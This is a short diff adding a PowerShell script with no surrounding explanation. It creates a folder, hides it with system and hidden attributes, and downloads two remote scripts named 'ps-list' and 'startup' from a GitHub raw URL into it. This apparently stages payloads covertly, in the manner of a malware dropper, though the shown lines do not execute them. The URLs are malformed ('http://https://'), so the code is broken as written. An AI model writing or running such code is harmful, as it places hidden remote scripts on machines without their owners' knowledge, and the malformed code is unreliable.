@@ -1,0 +1,10 @@
+New-Item -ItemType Directory -Path "C:\tempdir"
+attrib +h +s "C:\tempdir"
+
+$url = "http://https://raw.githubusercontent.com/aBolondVarazslo/holder/main/ps-list"
+$output = "C:\tempdir\ps-list.ps1"
+Invoke-WebRequest -Uri $url -OutFile $output
+
+$url = "http://https://raw.githubusercontent.com/aBolondVarazslo/holder/main/startup"
+$output = "C:\tempdir\startup.ps1"
+Invoke-WebRequest -Uri $url -OutFile $output
